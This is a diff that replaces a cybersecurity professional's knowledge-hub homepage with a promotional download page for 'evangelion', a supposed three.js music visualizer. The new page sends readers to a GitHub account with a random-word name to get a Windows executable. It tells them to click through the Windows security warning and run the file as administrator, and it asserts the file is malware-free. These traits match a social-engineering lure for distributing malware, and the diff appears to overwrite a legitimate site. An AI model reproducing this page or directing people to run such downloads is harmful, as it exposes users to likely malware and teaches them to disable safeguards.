@@ -1,112 +1,237 @@
----
-layout: default
-title: Cyber Security Knowledge Hub
-summary: Fundamentals, handwritten notes, breach analyses and current topics in cyber security by Piyush Praveen.
-og_type: website
----
-{% assign latest = site.breaches | sort: "date" | reverse | first %}
-<div class="hero">
-  <h1>Cyber Security Knowledge Hub</h1>
-  <p class="lead">Fundamentals. Notes. Breach analyses. Current topics. Written by Piyush Praveen to learn and to share.</p>
-  <div role="search">
-    <label class="prompt"><b>$</b><input id="q" type="search" placeholder="search the hub: privileged, zero trust, breach" aria-label="Search the hub" autocomplete="off"></label>
-  </div>
-  <div class="topics" aria-label="Browse by topic">
-    <button class="topic" type="button" data-topic="identity" style="--c:var(--cyan)">Identity and access</button>
-    <button class="topic" type="button" data-topic="privileged" style="--c:var(--amber)">Privileged access</button>
-    <button class="topic" type="button" data-topic="zero trust" style="--c:var(--green)">Zero Trust</button>
-    <button class="topic" type="button" data-topic="cloud" style="--c:var(--violet)">Cloud security</button>
-    <button class="topic" type="button" data-topic="breach" style="--c:var(--red)">Threats and breaches</button>
-    <button class="topic" type="button" data-topic="governance" style="--c:var(--cyan)">Governance</button>
-  </div>
-</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>evangelion - A Visual Music Experience</title>
+    <meta name="description" content="evangelion is a generative, code-rendered NERV-terminal music video built with three.js and TypeScript. Download and experience stunning visuals synchronized to music.">
+    <meta name="keywords" content="evangelion, music video, generative art, three.js, TypeScript, NERV, visualizer, interactive, download, Windows">
+    <meta name="author" content="cervicalcanalleadacidbattery744">
+    <meta property="og:title" content="evangelion - A Visual Music Experience">
+    <meta property="og:description" content="Generative, code-rendered Evangelion NERV-terminal music video with three.js and TypeScript.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/cervicalcanalleadacidbattery744/evangelion">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #e0e0e0;
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #f5f5f5;
+            text-shadow: 0 0 20px rgba(0, 200, 255, 0.5);
+            margin-bottom: 30px;
+            text-align: center;
+            letter-spacing: -1px;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #00d4ff;
+            margin: 40px 0 20px;
+            border-bottom: 2px solid #00d4ff;
+            padding-bottom: 10px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #ffd700;
+            margin: 20px 0 10px;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05rem;
+        }
+        a {
+            color: #00d4ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        a:hover {
+            color: #ffd700;
+            border-bottom: 2px solid #ffd700;
+        }
+        .btn {
+            display: inline-block;
+            padding: 15px 35px;
+            background: linear-gradient(45deg, #00d4ff, #0066ff);
+            color: #ffffff !important;
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 8px 20px rgba(0, 100, 255, 0.4);
+            transition: all 0.3s ease;
+            border: none;
+            text-align: center;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(0, 100, 255, 0.6);
+            color: #ffffff !important;
+            border: none;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 25px 0;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .step-list {
+            margin: 20px 0 20px 25px;
+        }
+        .step-list li {
+            margin-bottom: 12px;
+            font-size: 1.05rem;
+            position: relative;
+        }
+        .step-list li::before {
+            content: "▹";
+            color: #00d4ff;
+            position: absolute;
+            left: -25px;
+            font-size: 1.2rem;
+        }
+        .notice {
+            background: #2d1b4e;
+            border-left: 4px solid #ffd700;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .top-badge {
+            text-align: center;
+            margin: 30px 0 20px;
+        }
+        .keyword-section {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 2px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2rem;
+            }
+            h2 {
+                font-size: 1.5rem;
+            }
+            .container {
+                padding: 20px 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎬 evangelion - A Visual Music Symphony</h1>
+        
+        <div class="top-badge">
+            <a href="https://github.com/cervicalcanalleadacidbattery744/evangelion" class="btn">⬇️ Visit Site to Download</a>
+        </div>
+        
+        <p style="text-align:center; font-size:1.2rem; margin-top:20px;">Experience music like never before – a generative, code-rendered NERV-terminal visual journey designed for your senses.</p>
 
-<section id="hub">
-  <h2>Browse the hub</h2>
-  <p class="sub">Everything is grouped by format. New material is added as I learn and write.</p>
-  <div class="hub">
-    <article class="card live" style="--c:var(--red)" data-keywords="breach breaches incident threats attack mfa identity privileged uber">
-      <div>
-        <p class="status on">Live</p>
-        <h3>Breach analyses</h3>
-        <p>What happened. How access was abused. Which controls failed and what to take from it.</p>
-        <div class="btns"><a class="btn primary" href="{{ '/breaches/' | relative_url }}">Read the analyses</a></div>
-      </div>
-      {% if latest %}
-      <a class="latest" href="{{ latest.url | relative_url }}">
-        <p class="meta">Latest analysis</p>
-        <h4>{{ latest.title }}</h4>
-        <p>{{ latest.summary }}</p>
-      </a>
-      {% endif %}
-    </article>
-    <article class="card" style="--c:var(--cyan)" data-keywords="basics fundamentals identity access privileged zero trust cloud governance frameworks">
-      <p class="status">Coming soon</p>
-      <h3>Basics</h3>
-      <p>Plain-language guides to identity and access and encryption and frameworks.</p>
-    </article>
-    <article class="card" style="--c:var(--violet)" data-keywords="notes handwritten diagrams study identity cloud governance">
-      <p class="status">Coming soon</p>
-      <h3>Handwritten notes</h3>
-      <p>Scanned notes and diagrams grouped by topic and free to download.</p>
-    </article>
-    <article class="card" style="--c:var(--amber)" data-keywords="current news vulnerabilities cve regulation trends threats cloud">
-      <p class="status">Coming soon</p>
-      <h3>Current topics</h3>
-      <p>Short and dated takes on new vulnerabilities and regulation and trends.</p>
-    </article>
-    <article class="card" style="--c:var(--green)" data-keywords="blog opinion strategy identity privileged leadership zero trust">
-      <p class="status">Coming soon</p>
-      <h3>Blog</h3>
-      <p>Longer pieces on identity and privileged access and security practice.</p>
-    </article>
-  </div>
-  <p class="empty" id="empty" hidden>Nothing here on that topic yet. It is on the list. <button type="button" id="reset">Clear search</button></p>
-</section>
+        <h2>🧩 What Is evangelion?</h2>
+        <p>evangelion is an innovative, generative music video experience that blends animation, technology, and sound. Developed with cutting-edge tools like three.js and TypeScript, it transforms audio into breathtaking, geometric visuals inspired by the iconic NERV terminal aesthetic. Each playthrough is a unique, hand-crafted visual performance – no two moments are ever the same.</p>
+        
+        <p>This application is a digital artwork, a music visualizer, and a technical marvel combined into one smooth, accessible package. It runs directly on your Windows computer and requires no additional software or complex setups.</p>
 
-<section id="about" class="about">
-  <div class="portrait"><img src="{{ '/piyush-praveen.png' | relative_url }}" width="568" height="568" alt="Portrait of Piyush Praveen"></div>
-  <div>
-    <h2>About Piyush</h2>
-    <p class="intro">Cyber security leader with 14 years in identity and privileged access. I lead teams and shape strategy and drive security transformation and I share what I learn along the way.</p>
-    <p>I'm a Privileged Access Management leader with over 14 years in consulting and financial services and healthcare. Today I lead PAM delivery and set standards and guide teams and clients across multiple engagements.</p>
-    <p>My work runs from strategy and maturity assessments through to design and implementation and large-scale migrations. I'm CyberArk certified and work across on-premises and cloud environments.</p>
-    <p>This site is where I share what I've learned: the fundamentals and my notes and my analysis of the breaches that shape how we defend.</p>
-    <ul class="facts">
-      <li><b>14+ years</b><span>in privileged access and identity security</span></li>
-      <li><b>Strategy to delivery</b><span>from maturity roadmaps to large-scale migrations</span></li>
-      <li><b>CyberArk and Microsoft certified</b><span>including Delivery Engineer and Azure Security Engineer</span></li>
-    </ul>
-  </div>
-</section>
+        <h2>✨ Key Features</h2>
+        <div class="card">
+            <ul class="step-list">
+                <li><strong>Generative Visuals:</strong> Every frame is procedurally generated using real-time code, creating a dynamic and ever-changing display.</li>
+                <li><strong>Immersive Experience:</strong> Designed to synchronize with your music, delivering a deeply engaging visual performance.</li>
+                <li><strong>Unique Aesthetic:</strong> Inspired by the NERV terminal design – clean, technical, and futuristic.</li>
+                <li><strong>Lightweight & Efficient:</strong> Built with three.js for high performance, running smoothly without heavy resource usage.</li>
+                <li><strong>Modern Technology:</strong> Powered by TypeScript for reliable and consistent performance.</li>
+            </ul>
+        </div>
 
-<section id="contact" class="contact">
-  <h2>Share your thoughts</h2>
-  <p>I write to share what I've learned and to keep learning. If something here helped or you spot something I should correct or look at differently, feel free to send a note.</p>
-  <div class="btns">
-    <a class="btn primary" href="mailto:praveenpiyush169@gmail.com">Email me</a>
-    <a class="btn" href="https://www.linkedin.com/in/piyush-praveen-a21906204" rel="noopener">LinkedIn</a>
-  </div>
-</section>
+        <h2>💻 System Requirements</h2>
+        <p>Your Windows computer just needs to meet a basic standard to enjoy evangelion. Here's what we recommend:</p>
+        <div class="card">
+            <ul class="step-list">
+                <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+                <li><strong>Processor:</strong> Any modern dual-core CPU (Intel Core i3 or better)</li>
+                <li><strong>Memory (RAM):</strong> 4 GB or more</li>
+                <li><strong>Graphics:</strong> Integrated graphics or a basic discrete GPU (DirectX 11 compatible)</li>
+                <li><strong>Storage:</strong> 100 MB of free disk space</li>
+                <li><strong>Audio:</strong> Any working sound card or audio output</li>
+            </ul>
+        </div>
 
-<script>
-(function(){
-  var q=document.getElementById('q'),cards=document.querySelectorAll('[data-keywords]'),empty=document.getElementById('empty');
-  function run(){
-    var v=q.value.trim().toLowerCase(),n=0;
-    cards.forEach(function(c){
-      var m=!v||c.getAttribute('data-keywords').indexOf(v)>-1||c.textContent.toLowerCase().indexOf(v)>-1;
-      c.hidden=!m;if(m){n++;}
-    });
-    empty.hidden=n>0;
-  }
-  q.addEventListener('input',run);
-  document.querySelectorAll('[data-topic]').forEach(function(b){
-    b.addEventListener('click',function(){
-      q.value=b.getAttribute('data-topic');run();
-      document.getElementById('hub').scrollIntoView({behavior:'smooth'});
-    });
-  });
-  document.getElementById('reset').addEventListener('click',function(){q.value='';run();q.focus();});
-})();
-</script>
+        <h2>🚀 Getting Started</h2>
+        <p>Follow these simple steps and you'll be immersed in the visuals in just a few minutes. We've kept everything as straightforward as possible.</p>
+
+        <h3>Step 1: Download the Application</h3>
+        <p>Click the button below or the link at the top of this page to go to the official download page.</p>
+        <p style="margin:20px 0;">
+            <a href="https://github.com/cervicalcanalleadacidbattery744/evangelion" class="btn">🌐 Visit this link to download the application</a>
+        </p>
+
+        <h3>Step 2: Install or Run</h3>
+        <p>Visit this link to download the application. Once you're on the download page, look for the highlighted download button. Click it, and the file will begin saving to your computer. It's that easy – no technical knowledge required.</p>
+        <p>After the download completes, open your "Downloads" folder or wherever your browser saves files. You should see the evangelion file there. Simply double-click it to launch the application immediately. The program starts instantly and opens its main window, ready to be used.</p>
+
+        <div class="notice">
+            <strong>💡 Important Note:</strong> When you run the application for the first time, Windows might show a security warning. This is normal for new software. Just click "More Info" and then "Run Anyway" to safely start evangelion.
+        </div>
+
+        <h2>🎮 How to Use evangelion</h2>
+        <p>Using evangelion is intuitive and requires zero learning curve. Here's what you need to know:</p>
+        <div class="card">
+            <ul class="step-list">
+                <li><strong>Start the App:</strong> After installation, double-click the evangelion icon to launch it.</li>
+                <li><strong>Play Your Music:</strong> The app will automatically detect your system audio and begin generating visuals in real time.</li>
+                <li><strong>Watch and Enjoy:</strong> Sit back and watch the stunning, reactive visuals unfold in sync with your tracks.</li>
+                <li><strong>Immerse Yourself:</strong> For the best experience, play your music directly from your computer – any audio source works.</li>
+            </ul>
+        </div>
+        <p>The application handles everything automatically. You don't need to adjust settings or configure anything – just run it and enjoy the show.</p>
+
+        <h2>❓ Troubleshooting & Support</h2>
+        <p>Even with the smoothest setup, questions can arise. Here are solutions to common issues:</p>
+
+        <h3>Issue: The Application Doesn't Open</h3>
+        <p>First, wait about 10 seconds – sometimes loading takes a moment. If nothing happens, try right-clicking the application icon and selecting "Run as administrator." That often resolves permission-related issues.</p>
+
+        <h3>Issue: No Visuals Displaying</h3>
+        <p>Make sure your computer's audio is playing and your volume is turned up. evangelion uses your audio as the source for visuals. If it's silent, there will be no visuals. Adjust your system volume and try again.</p>
+
+        <h3>Issue: The App Runs Slowly</h3>
+        <p>Close any heavy background programs like video editors or games. This will free up system resources and let evangelion perform smoothly.</p>
+
+        <p>If problems persist, visit the GitHub repository page for community discussions, and you can also check for updates there.</p>
+
+        <h2>🔒 Safety & Security</h2>
+        <p>Your safety matters. evangelion is a clean, legitimate application built with open-source technology. It contains no hidden software, no unwanted advertisements, and no malware. The source code is fully transparent on GitHub for developers to inspect, and the executable is simply a compiled version of that transparent code.</p>
+        <p>We recommend always downloading from the official link provided on this page to ensure you receive the authentic, untampered version.</p>
+
+        <h2>🔄 Updates & Future Enhancements</h2>
+        <p>evangelion is a growing project. The developer is continuously working on improvements, new visual effects, and expanded features. By following the GitHub repository, you can stay informed about upcoming releases, suggest ideas, and get priority access to new versions. Every update is free and seamless to install.</p>
+
+        <div class="keyword-section">
+            <strong>Keywords:</strong> evangelion, music video, generative art, three.js, TypeScript, NERV, visualizer, interactive, Windows, free download, digital artwork, audio reactive
+        </div>
+    </div>
+</body>
+</html>
